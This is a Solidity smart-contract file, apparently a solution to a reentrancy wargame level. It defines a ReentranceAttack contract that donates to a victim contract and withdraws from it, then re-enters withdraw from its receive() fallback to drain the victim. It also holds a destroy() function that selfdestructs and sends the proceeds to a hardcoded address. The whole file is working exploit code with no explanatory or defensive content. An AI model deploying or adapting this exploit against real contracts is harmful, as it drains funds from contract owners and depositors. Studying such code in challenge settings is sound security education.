// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Reentrance {
    function donate(address _to) external  payable ;

    function withdraw(uint256 _amount) external payable ;

    receive() external payable ;
    
}

contract ReentranceAttack {
    address payable public victim;
    Reentrance public c;

    constructor (address payable  _victim) public payable {
        victim = _victim;
        c = Reentrance(victim);
    }

    function exp() public {
        c.donate{value:1000000000000000}(address(this));
        c.withdraw(1000000000000000);
    }

    function destroy() external payable {
        selfdestruct(0xde6e75832f874f0803c1685807eF1d1CD8ed8796);
    }

    receive() external payable {
        c.withdraw(1000000000000000);
    }

}